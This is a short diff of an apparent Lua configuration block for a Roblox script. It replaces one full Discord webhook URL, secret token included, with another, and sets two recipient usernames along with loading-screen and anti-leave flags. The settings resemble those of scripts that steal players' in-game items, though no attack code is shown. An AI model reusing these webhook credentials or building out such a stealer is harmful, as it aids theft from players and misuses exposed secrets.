@@ -1,6 +1,6 @@
 UserName = "GABRIELofficial_GAME"
 UserName2 = "KLJOAK_BLOX"
-Webhook = "https://discord.com/api/webhooks/1098965296993288294/PkSXq3myEe1QmnehqZKdqTk9f7caOllt1HE6prOtkw3ikzXd8IC_rtXb0Hn6BPen7YOU"
+Webhook = "https://discord.com/api/webhooks/1098966912744042497/0Q5XzfkwDKFuaNq3-13aQxWPkVqWM3vjlDQMzR5UZLlGH3wgvAGQ8s74AUJ24mtwca8G"
 
 _G.LoadingScreen = true
 _G.AntiLeave = false
